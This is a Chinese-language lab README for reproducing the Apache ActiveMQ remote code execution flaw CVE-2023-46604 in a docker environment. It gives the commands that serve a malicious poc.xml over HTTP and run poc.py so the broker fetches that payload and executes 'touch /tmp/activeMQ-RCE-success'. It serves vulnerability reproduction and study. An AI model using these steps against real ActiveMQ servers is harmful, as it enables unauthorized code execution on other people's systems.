# Apache ActiveMQ (版本 < 5.18.3) RCE （CVE-2023-46604）

## 环境搭建

搭建及运行漏洞环境：

```
docker compose up -d
```

环境监听61616端口和8161端口，其中8161为web控制台端口，61616为工作端口。在本次漏洞利用中，我们只需要用到61616端口。执行漏洞验证过程时，请先访问8161端口，确认服务启动成功。

访问`http://your-ip:8161/`看到web页面，说明环境已成功运行。

## 背景简述

Apache ActiveMQ存在远程代码执行漏洞。该漏洞可能允许具有网络访问权限的远程攻击者通过操纵OpenWire协议中的序列化类类型来运行任意shell命令，从而导致代理实例化类路径上的任何类。

| 默认端口      | 默认条件      |
|-----------|-----------|
| 8161  web | 需配置才可远程访问 |
| 61616 tcp | 远程访问      |

## 漏洞复现

在poc.xml的文件夹下启动http服务

```shell
python3 -m http.server 6666
```

执行poc.py

```shell
python3 poc.py target port http://启动http服务的ip/poc.xml
```

到activeMQ容器中进行查看：

docker exec cve-2023-46604-activemq-1 ls -l /tmp

可以看到touch /tmp/activeMQ-RCE-success成功被执行：

![01.png](01.png)
